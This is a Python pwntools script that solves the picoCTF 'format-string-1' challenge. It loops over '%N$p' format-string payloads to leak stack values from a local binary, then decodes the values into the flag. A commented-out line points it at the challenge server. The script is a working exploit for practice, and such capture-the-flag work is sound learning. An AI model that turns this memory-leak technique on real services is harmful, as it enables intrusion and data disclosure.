from pwn import *

context.log_level = 'info'

flag = ''

for i in range(0, 0xff):
    try:
        # io = remote('mimas.picoctf.net', 63564, level='warn')
        io = process("./format-string-1")
        io.recvuntil(':')
        io.sendline('%{}$p'.format(i).encode())
        io.recvuntil('order: ')
        result = io.recvline()
        if not b'nil' in result:
            print(str(i) + ': ' + str(result))
            try:
                decoded = unhex(result.strip().decode()[2:])
                reversed_hex = decoded[::-1]
                print(str(reversed_hex))
                flag += reversed_hex.decode()
            except BaseException:
                pass
        io.close()
    except EOFError:
        io.close()

info(flag)
